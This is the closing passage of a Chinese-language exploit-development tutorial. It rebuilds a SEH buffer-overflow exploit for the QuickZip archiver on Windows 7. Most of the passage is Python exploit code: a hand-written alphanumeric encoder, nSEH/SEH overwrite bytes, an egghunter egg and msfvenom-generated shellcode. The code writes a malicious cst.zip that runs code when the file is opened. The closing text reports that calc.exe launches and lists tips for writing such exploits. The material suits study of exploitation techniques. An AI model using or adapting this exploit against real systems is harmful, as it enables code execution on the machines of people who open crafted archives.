payload += "x05x10x10x10x22"   # add eax, 0x22101010
payload += "x2dx12x12x12x11"   # sub eax, 0x11121212
payload += "x50"                   # push eax;
                                    # Zero-out EAX
payload += "x25x01x01x01x01"   # and eax,0x01010101
payload += "x25x10x10x10x10"   # and eax,0x10101010
                                       # write 0xbe2d5854 into EAX
payload += "x05x43x47x1cx67"   # add eax, 0x671c4743
payload += "x05x11x11x11x57"   # add eax, 0x57111111
payload += "x50"                   # push eax;
payload += "A" * (nseh_offset - len(payload))    # padding for the rest of encoder
payload += "x71x9bx70x9b"       # nSEH: jno $-99; jo $-99   =&gt; '9b' will actually be converted to 'a2', which is $-92
payload += "x33x28x42x00"       # SEH
shellcode = "w00tw00t"                     # egg
shellcode += "x81xe4xf0xffxffxff"    # align the stack: AND esp,0xFFFFFFF0
# msfvenom -p windows/exec CMD=calc.exe -b 'x00x0ax0d'
# [*] x86/shikata_ga_nai succeeded with size 227 (iteration=1)
shellcode += ("xbfxdcxaex26x3dxdaxddxd9x74x24xf4x5bx31xc9"
"xb1x33x31x7bx12x03x7bx12x83x37x52xc4xc8x3b"
"x43x80x33xc3x94xf3xbax26xa5x21xd8x23x94xf5"
"xaax61x15x7dxfex91xaexf3xd7x96x07xb9x01x99"
"x98x0fx8ex75x5ax11x72x87x8fxf1x4bx48xc2xf0"
"x8cxb4x2dxa0x45xb3x9cx55xe1x81x1cx57x25x8e"
"x1dx2fx40x50xe9x85x4bx80x42x91x04x38xe8xfd"
"xb4x39x3dx1ex88x70x4axd5x7ax83x9ax27x82xb2"
"xe2xe4xbdx7bxefxf5xfaxbbx10x80xf0xb8xadx93"
"xc2xc3x69x11xd7x63xf9x81x33x92x2ex57xb7x98"
"x9bx13x9fxbcx1axf7xabxb8x97xf6x7bx49xe3xdc"
"x5fx12xb7x7dxf9xfex16x81x19xa6xc7x27x51x44"
"x13x51x38x02xe2xd3x46x6bxe4xebx48xdbx8dxda"
"xc3xb4xcaxe2x01xf1x25xa9x08x53xaex74xd9xe6"
"xb3x86x37x24xcax04xb2xd4x29x14xb7xd1x76x92"
"x2bxabxe7x77x4cx18x07x52x2fxffx9bx3ex9ex9a"
"x1bxa4xde")
payload += shellcode
payload += "A" * (max_size - len(payload))    # padding
payload += ".txt"
print "[+] Length = " + str(len(payload))
exploit = header_1 + payload + header_2 + payload + header_3 + payload
mefile = open('cst.zip','w');
mefile.write(exploit);
mefile.close()
print "[+] Exploit complete!"
```

当我们打开生成的cst.zip文件时，我们的漏洞利用代码就会运行，几秒钟（因为egghunter通过应用程序的内存找到“蛋”）后，我们应该看到计算器被打开。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t014833ab6c59c64db9.png)

成功了！！

<br>

**小结**

在本文中，我们已经成功地重新创建了QuickZip漏洞利用代码的64位版本，它已经可以在Windows 7上运行了！

总而言之，我们通过使用非常有限的、被允许的字符集（几乎可以ASCII打印）创建了一个egghunter漏洞利用代码，编写了我们自己的编码器，并通过在内存中的跳转，到达egghunter代码，最终到达shellcode。

需要注意的是：

找出允许使用的字符，并在发生错误时记住这些字符

如果缓冲区大小不够，不要气馁——发挥你的创造性！

确保您使用正确的egghunter代码（32位与64位），具体取决于您正在开发漏洞的平台

编写自己的编码器不是那么难，但需要大量的练习和耐心

确保在执行shellcode之前对齐堆栈 
